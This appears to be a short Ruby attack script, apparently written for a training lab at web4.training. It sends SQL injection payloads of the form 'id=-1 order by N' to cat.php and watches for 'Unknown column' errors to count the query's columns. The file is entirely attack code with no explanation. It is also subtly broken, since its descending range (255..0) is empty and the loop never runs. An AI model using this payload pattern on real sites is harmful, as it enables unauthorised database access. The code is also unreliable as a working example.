require "net/http"
require "uri"

url = URI.parse("http://web4.training/cat.php")

puts "Determining number of columns"

(255..0).each do |columns|
        puts "columns %d" % columns
        params = sprintf("id=-1 order by %d", columns)
        headers = {'Cookie' => "yick=yack"}
        resp = Net::HTTP.start(url.host, url.port) do |http|
            http.post(url.request_uri, params, headers)
        end

        if resp.body !~ /Unknown column / 
            puts "We need %d columns" % columns
            break
        end
end

